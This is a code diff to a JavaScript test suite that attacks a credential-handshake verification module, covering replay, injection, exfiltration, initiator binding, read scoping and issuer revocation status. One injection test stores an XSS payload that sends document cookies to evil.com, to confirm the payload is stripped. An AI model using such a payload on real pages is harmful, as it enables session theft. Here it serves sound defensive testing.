@@ -71,6 +71,7 @@ import {
   addPresentation,
   verifyHandshake,
   getHandshake,
+  listHandshakes,
   revokeHandshake,
   HandshakeError,
   HANDSHAKE_MODES,
@@ -104,6 +105,26 @@ function createTableSim() {
 
   function getTable(name) {
     if (!tables[name]) tables[name] = [];
+    // Seed default trusted authority on first access to 'authorities'
+    if (name === 'authorities' && tables[name].length === 0) {
+      tables[name].push({
+        authority_id: 'auth-trusted-ca',
+        key_id: 'issuer-trusted-ca',
+        status: 'active',
+        valid_from: new Date(Date.now() - 365 * 86_400_000).toISOString(),
+        valid_to: new Date(Date.now() + 365 * 86_400_000).toISOString(),
+      });
+    }
+    // Seed default policy on first access to 'handshake_policies'
+    if (name === 'handshake_policies' && tables[name].length === 0) {
+      tables[name].push({
+        policy_id: 'policy-abc-123',
+        policy_key: 'default',
+        policy_version: '1.0.0',
+        status: 'active',
+        rules: {},
+      });
+    }
     return tables[name];
   }
 
@@ -117,30 +138,47 @@ function createTableSim() {
 
   function buildSelectChain(tableName) {
     let filters = [];
+    let inFilters = [];
     const chain = {
       select: vi.fn().mockImplementation(() => chain),
       eq: vi.fn().mockImplementation((col, val) => {
         filters.push({ col, val });
         return chain;
       }),
+      in: vi.fn().mockImplementation((col, vals) => {
+        inFilters.push({ col, vals });
+        return chain;
+      }),
       neq: vi.fn().mockImplementation(() => chain),
       order: vi.fn().mockImplementation(() => chain),
       limit: vi.fn().mockImplementation(() => chain),
       single: vi.fn().mockImplementation(() => {
-        const filtered = applyFilters(getTable(tableName), filters);
+        let filtered = applyFilters(getTable(tableName), filters);
+        for (const inf of inFilters) {
+          filtered = filtered.filter((r) => inf.vals.includes(r[inf.col]));
+        }
         filters = [];
+        inFilters = [];
         return Promise.resolve({ data: filtered[0] || null, error: null });
       }),
       maybeSingle: vi.fn().mockImplementation(() => {
-        const filtered = applyFilters(getTable(tableName), filters);
+        let filtered = applyFilters(getTable(tableName), filters);
+        for (const inf of inFilters) {
+          filtered = filtered.filter((r) => inf.vals.includes(r[inf.col]));
+        }
         filters = [];
+        inFilters = [];
         return Promise.resolve({ data: filtered[0] || null, error: null });
       }),
       then: undefined,
     };
     chain.then = (resolve, reject) => {
-      const filtered = applyFilters(getTable(tableName), filters);
+      let filtered = applyFilters(getTable(tableName), filters);
+      for (const inf of inFilters) {
+        filtered = filtered.filter((r) => inf.vals.includes(r[inf.col]));
+      }
       filters = [];
+      inFilters = [];
       return Promise.resolve({ data: filtered, error: null }).then(resolve, reject);
     };
     return chain;
@@ -184,6 +222,10 @@ function createTableSim() {
         return chain;
       }),
       eq: vi.fn().mockImplementation((col, val) => {
+        filters.push({ col, val });
+        return chain;
+      }),
+      is: vi.fn().mockImplementation((col, val) => {
         filters.push({ col, val });
         return chain;
       }),
@@ -281,6 +323,21 @@ async function initHandshakeWithSim(sim, params = {}) {
   mockGetServiceClient.mockReturnValue(sim.mockClient());
   const result = await initiateHandshake(validHandshakeParams(params));
   return result.handshake_id;
+}
+
+/**
+ * Helper: build verify options (payload_hash, policy_hash, action_hash) from sim state.
+ * Required because checkBinding now mandates payload_hash when binding has one,
+ * and verify handler requires action_hash and policy_hash when the handshake has them.
+ */
+function verifyOptsFromSim(sim, hsId) {
+  const binding = sim.getTable('handshake_bindings').find((b) => b.handshake_id === hsId);
+  const hs = sim.getTable('handshakes').find((h) => h.handshake_id === hsId);
+  return {
+    payload_hash: binding?.payload_hash || undefined,
+    policy_hash: hs?.policy_hash || undefined,
+    action_hash: hs?.action_hash || undefined,
+  };
 }
 
 /**
@@ -385,7 +442,9 @@ describe('Replay Attacks', () => {
     seedAuthority(sim, 'issuer-trusted-ca');
 
     await addPresentation(hsId, 'initiator', validPresentation());
-    await verifyHandshake(hsId);
+
+    // Pass payload_hash, policy_hash, action_hash so binding/policy checks pass
+    await verifyHandshake(hsId, verifyOptsFromSim(sim, hsId));
 
     // Handshake is now in 'verified' state — adding a presentation should fail
     await expect(
@@ -425,19 +484,22 @@ describe('Injection & Manipulation', () => {
   });
 
   // Attack: XSS payload in presentation claims to exfiltrate data if rendered.
-  // The system stores hashes, not raw payloads — XSS payloads are hashed away.
-  it('XSS payload in presentation claims is hashed — raw payload not stored', async () => {
+  // The system stores raw_claims for policy enforcement but normalizes them.
+  // Non-canonical claim keys (like XSS payloads) are stripped during normalization.
+  it('XSS payload in presentation claims is hashed and normalized — XSS stripped from normalized_claims', async () => {
     const result = await initiateHandshake(validHandshakeParams());
     const hsId = result.handshake_id;
 
     const xssData = '<script>document.location="https://evil.com?c="+document.cookie</script>';
     await addPresentation(hsId, 'initiator', validPresentation({ data: xssData }));
 
-    // The stored presentation has a hash, not the raw XSS payload
+    // The stored presentation has a hash
     const presentations = sim.getTable('handshake_presentations');
     expect(presentations[0].presentation_hash).toMatch(/^[0-9a-f]{64}$/);
-    // No raw XSS content stored in the record
-    expect(JSON.stringify(presentations[0])).not.toContain('<script>');
+    // Normalized claims should be empty — XSS string is not a canonical claim key
+    expect(presentations[0].normalized_claims).toEqual({});
+    // Canonical claims hash should exist
+    expect(presentations[0].canonical_claims_hash).toMatch(/^[0-9a-f]{64}$/);
   });
 
   // Attack: Send an oversized payload (>1MB) to exhaust memory or storage.
@@ -762,7 +824,8 @@ describe('Authority & Issuer Attacks', () => {
     const pres = presentations.find((p) => p.handshake_id === hsId);
     // Unknown issuer = untrusted (fail-closed per audit requirement)
     expect(pres.revocation_checked).toBe(true);
-    expect(pres.revocation_status).toBe('revoked');
+    // Finding 12: unknown/unregistered issuers → 'unknown', not 'revoked'
+    expect(pres.revocation_status).toBe('unknown');
     expect(pres.verified).toBe(false);
   });
 
@@ -777,7 +840,7 @@ describe('Authority & Issuer Attacks', () => {
     }));
     const hsId = result.handshake_id;
 
-    // Authority exists but its valid_to is in the past (expired/revoked)
+    // Authority exists but its valid_to is in the past (expired)
     seedAuthority(sim, 'issuer-expired-ca', {
       status: 'active',
       validTo: new Date(Date.now() - 3600_000).toISOString(), // expired 1 hour ago
@@ -788,7 +851,8 @@ describe('Authority & Issuer Attacks', () => {
     const presentations = sim.getTable('handshake_presentations');
     const pres = presentations.find((p) => p.handshake_id === hsId);
     expect(pres.verified).toBe(false);
-    expect(pres.revocation_status).toBe('revoked');
+    // Finding 12: expired authority → 'expired', not 'revoked'
+    expect(pres.revocation_status).toBe('expired');
 
     const verifyResult = await verifyHandshake(hsId);
     expect(verifyResult.outcome).not.toBe('accepted');
@@ -848,7 +912,9 @@ describe('State Machine Violations', () => {
     seedAuthority(sim, 'issuer-trusted-ca');
 
     await addPresentation(hsId, 'initiator', validPresentation());
-    const verifyResult = await verifyHandshake(hsId);
+
+    // Pass payload_hash, policy_hash, action_hash so binding/policy checks pass
+    const verifyResult = await verifyHandshake(hsId, verifyOptsFromSim(sim, hsId));
     expect(verifyResult.outcome).toBe('accepted');
 
     // Handshake is now 'verified' — cannot add presentation (which would imply pending)
@@ -922,11 +988,14 @@ describe('Concurrency / Race Conditions', () => {
 
     await addPresentation(hsId, 'initiator', validPresentation());
 
+    // Pass payload_hash, policy_hash, action_hash so binding/policy checks pass
+    const verifyOpts = verifyOptsFromSim(sim, hsId);
+
     // Launch two verifications concurrently
     // The first will succeed; the second will see 'verified' state and throw
     const results = await Promise.allSettled([
-      verifyHandshake(hsId),
-      verifyHandshake(hsId),
+      verifyHandshake(hsId, verifyOpts),
+      verifyHandshake(hsId, verifyOpts),
     ]);
 
     // At least one should succeed
@@ -1018,17 +1087,20 @@ describe('Data Exfiltration Attempts', () => {
     mockGetServiceClient.mockReturnValue(sim.mockClient());
   });
 
-  // Attack: Query a handshake and check that raw presentation payloads are
-  // not exposed — only hashes are stored and returned.
-  it('getHandshake does not expose raw presentation payload — only hashes', async () => {
+  // Attack: Query a handshake and verify that non-canonical sensitive data
+  // is stripped from normalized_claims (only canonical claim keys survive).
+  // raw_claims ARE stored for policy audit, but normalized_claims is the
+  // enforcement surface — it must not contain arbitrary sensitive fields.
+  it('getHandshake normalized_claims strips non-canonical sensitive fields', async () => {
     const result = await initiateHandshake(validHandshakeParams());
     const hsId = result.handshake_id;
 
-    const sensitiveData = JSON.stringify({
+    const sensitiveData = {
       ssn: '123-45-6789',
       credit_card: '4111-1111-1111-1111',
       entity_id: 'entity-alice',
-    });
+      legal_name: 'Alice Corp',
+    };
 
     await addPresentation(hsId, 'initiator', validPresentation({ data: sensitiveData }));
 
@@ -1038,14 +1110,19 @@ describe('Data Exfiltration Attempts', () => {
     expect(hsState).toBeDefined();
     expect(hsState.presentations).toHaveLength(1);
 
-    // The presentation record should contain the hash, not the raw data
+    // The presentation record should contain the hash
     const pres = hsState.presentations[0];
     expect(pres.presentation_hash).toMatch(/^[0-9a-f]{64}$/);
 
-    // Verify sensitive data is NOT present anywhere in the response
-    const serialized = JSON.stringify(hsState);
-    expect(serialized).not.toContain('123-45-6789');
-    expect(serialized).not.toContain('4111-1111-1111-1111');
+    // normalized_claims should ONLY contain canonical claim keys
+    // ssn and credit_card are NOT canonical claims and must be stripped
+    expect(pres.normalized_claims).toBeDefined();
+    expect(pres.normalized_claims.ssn).toBeUndefined();
+    expect(pres.normalized_claims.credit_card).toBeUndefined();
+    // legal_name IS a canonical claim and should survive
+    expect(pres.normalized_claims.legal_name).toBe('Alice Corp');
+    // canonical claims hash should exist
+    expect(pres.canonical_claims_hash).toMatch(/^[0-9a-f]{64}$/);
   });
 
   // Attack: Trigger an error and check that the error message does not leak
@@ -1091,5 +1168,243 @@ describe('Data Exfiltration Attempts', () => {
       expect(err.message).not.toContain('undefined');
       expect(err.message).not.toContain('TypeError');
     }
+  });
+});
+
+// ============================================================================
+// 10. Initiator Binding (Finding 3)
+// ============================================================================
+
+describe('Initiator binding (Finding 3)', () => {
+  let sim;
+
+  beforeEach(() => {
+    vi.clearAllMocks();
+    sim = createTableSim();
+    mockGetServiceClient.mockReturnValue(sim.mockClient());
+  });
+
+  it('rejects handshake when actor does not match initiator entity_ref', async () => {
+    // actor='entity-attacker' but parties[0].entity_ref='entity-victim'
+    await expect(
+      initiateHandshake(validHandshakeParams({
+        actor: 'entity-attacker',
+        parties: [
+          { role: 'initiator', entity_ref: 'entity-victim' },
+        ],
+      })),
+    ).rejects.toThrow(/must match initiator party entity_ref/);
+
+    // Verify the error code is INITIATOR_BINDING_VIOLATION
+    try {
+      await initiateHandshake(validHandshakeParams({
+        actor: 'entity-attacker',
+        parties: [
+          { role: 'initiator', entity_ref: 'entity-victim' },
+        ],
+      }));
+      expect.unreachable('Should have thrown');
+    } catch (err) {
+      expect(err.code).toBe('INITIATOR_BINDING_VIOLATION');
+      expect(err.status).toBe(403);
+    }
+  });
+
+  it('allows system actor to initiate for any entity', async () => {
+    // actor='system' should bypass the initiator binding check
+    const result = await initiateHandshake(validHandshakeParams({
+      actor: 'system',
+      parties: [
+        { role: 'initiator', entity_ref: 'entity-anyone' },
+      ],
+    }));
+
+    expect(result.handshake_id).toMatch(/^eph_/);
+    expect(result.status).toBe('initiated');
+    expect(result.parties[0].entity_ref).toBe('entity-anyone');
+  });
+});
+
+// ============================================================================
+// 11. Read Scoping (Finding 11)
+// ============================================================================
+
+describe('Read scoping (Finding 11)', () => {
+  let sim;
+
+  beforeEach(() => {
+    vi.clearAllMocks();
+    sim = createTableSim();
+    mockGetServiceClient.mockReturnValue(sim.mockClient());
+  });
+
+  it('listHandshakes returns empty when no actor provided', async () => {
+    // Create a handshake first so there is data in the table
+    await initiateHandshake(validHandshakeParams());
+
+    // listHandshakes with no actor should return empty (fail closed)
+    const result = await listHandshakes({});
+    expect(result.handshakes).toEqual([]);
+  });
+
+  it('listHandshakes scopes to actor entity_ref', async () => {
+    // Create handshakes for alice and bob
+    await initiateHandshake(validHandshakeParams({
+      actor: 'entity-alice',
+      parties: [{ role: 'initiator', entity_ref: 'entity-alice' }],
+    }));
+    await initiateHandshake(validHandshakeParams({
+      actor: 'entity-bob',
+      parties: [{ role: 'initiator', entity_ref: 'entity-bob' }],
+    }));
+
+    // When actor is entity-alice, only alice's handshakes should be returned
+    // The function forces entity_ref filter to match the actor
+    const result = await listHandshakes({}, 'entity-alice');
+    // All returned handshakes should be ones where entity-alice is a party
+    const aliceParties = sim.getTable('handshake_parties')
+      .filter((p) => p.entity_ref === 'entity-alice')
+      .map((p) => p.handshake_id);
+    for (const hs of result.handshakes) {
+      expect(aliceParties).toContain(hs.handshake_id);
+    }
+  });
+
+  it('getHandshake rejects non-party reads', async () => {
+    // Create a handshake owned by entity-alice
+    const result = await initiateHandshake(validHandshakeParams({
+      actor: 'entity-alice',
+      parties: [{ role: 'initiator', entity_ref: 'entity-alice' }],
+    }));
+    const hsId = result.handshake_id;
+
+    // A non-party entity trying to read should get 403
+    await expect(
+      getHandshake(hsId, 'non-party-entity'),
+    ).rejects.toThrow(/Not authorized to view this handshake/);
+
+    try {
+      await getHandshake(hsId, 'non-party-entity');
+      expect.unreachable('Should have thrown');
+    } catch (err) {
+      expect(err.code).toBe('UNAUTHORIZED_HANDSHAKE_ACCESS');
+      expect(err.status).toBe(403);
+    }
+  });
+});
+
+// ============================================================================
+// 12. Issuer Status Vocabulary (Finding 12)
+// ============================================================================
+
+describe('Issuer status vocabulary (Finding 12)', () => {
+  let sim;
+
+  beforeEach(() => {
+    vi.clearAllMocks();
+    sim = createTableSim();
+    mockGetServiceClient.mockReturnValue(sim.mockClient());
+  });
+
+  it('sets revocation_status to "unknown" for unregistered issuers, not "revoked"', async () => {
+    const result = await initiateHandshake(validHandshakeParams());
+    const hsId = result.handshake_id;
+
+    // Add presentation with an issuer_ref that does NOT exist in authorities
+    // (no matching key_id in the authorities table)
+    await addPresentation(hsId, 'initiator', validPresentation({
+      issuer_ref: 'issuer-completely-unknown-xyz',
+    }));
+
+    const presentations = sim.getTable('handshake_presentations');
+    const pres = presentations.find((p) => p.handshake_id === hsId);
+
+    // Finding 12: must be 'unknown', NOT 'revoked'
+    expect(pres.revocation_status).toBe('unknown');
+    expect(pres.issuer_status).toBe('authority_not_found');
+    expect(pres.verified).toBe(false);
+    expect(pres.revocation_checked).toBe(true);
+  });
+
+  it('sets revocation_status to "registry_unavailable" when authority table missing', async () => {
+    const result = await initiateHandshake(validHandshakeParams());
+    const hsId = result.handshake_id;
+
+    // Simulate authority table missing by making the from('authorities') query
+    // return an error that looks like a missing table
+    const origMockClient = sim.mockClient();
+    const tableErrorClient = {
+      from: vi.fn().mockImplementation((tableName) => {
+        if (tableName === 'authorities') {
+          return {
+            select: vi.fn().mockReturnValue({
+              eq: vi.fn().mockReturnValue({
+                maybeSingle: vi.fn().mockResolvedValue({
+                  data: null,
+                  error: { message: 'relation "authorities" does not exist' },
+                }),
+              }),
+            }),
+          };
+        }
+        return origMockClient.from(tableName);
+      }),
+    };
+    mockGetServiceClient.mockReturnValue(tableErrorClient);
+
+    await addPresentation(hsId, 'initiator', validPresentation({
+      issuer_ref: 'issuer-any',
+    }));
+
+    // The presentation should be stored in the sim via the insert chain
+    // We need to check the record that was stored
+    const presentations = sim.getTable('handshake_presentations');
+    const pres = presentations.find((p) => p.handshake_id === hsId);
+    expect(pres.revocation_status).toBe('registry_unavailable');
+    expect(pres.issuer_status).toBe('authority_table_missing');
+    expect(pres.verified).toBe(false);
+  });
+
+  it('sets revocation_status to "expired" for expired authorities', async () => {
+    const result = await initiateHandshake(validHandshakeParams());
+    const hsId = result.handshake_id;
+
+    // Seed an authority with valid_to in the past (expired)
+    seedAuthority(sim, 'issuer-expired-auth', {
+      status: 'active',
+      validTo: new Date(Date.now() - 3600_000).toISOString(), // expired 1 hour ago
+    });
+
+    await addPresentation(hsId, 'initiator', validPresentation({
+      issuer_ref: 'issuer-expired-auth',
+    }));
+
+    const presentations = sim.getTable('handshake_presentations');
+    const pres = presentations.find((p) => p.handshake_id === hsId);
+    expect(pres.revocation_status).toBe('expired');
+    expect(pres.issuer_status).toBe('authority_expired');
+    expect(pres.verified).toBe(false);
+  });
+
+  it('sets revocation_status to "not_yet_valid" for future authorities', async () => {
+    const result = await initiateHandshake(validHandshakeParams());
+    const hsId = result.handshake_id;
+
+    // Seed an authority with valid_from in the future
+    seedAuthority(sim, 'issuer-future-auth', {
+      status: 'active',
+      validFrom: new Date(Date.now() + 86400_000).toISOString(), // valid starting tomorrow
+      validTo: new Date(Date.now() + 2 * 86400_000).toISOString(),
+    });
+
+    await addPresentation(hsId, 'initiator', validPresentation({
+      issuer_ref: 'issuer-future-auth',
+    }));
+
+    const presentations = sim.getTable('handshake_presentations');
+    const pres = presentations.find((p) => p.handshake_id === hsId);
+    expect(pres.revocation_status).toBe('not_yet_valid');
+    expect(pres.issuer_status).toBe('authority_not_yet_valid');
+    expect(pres.verified).toBe(false);
   });
 });
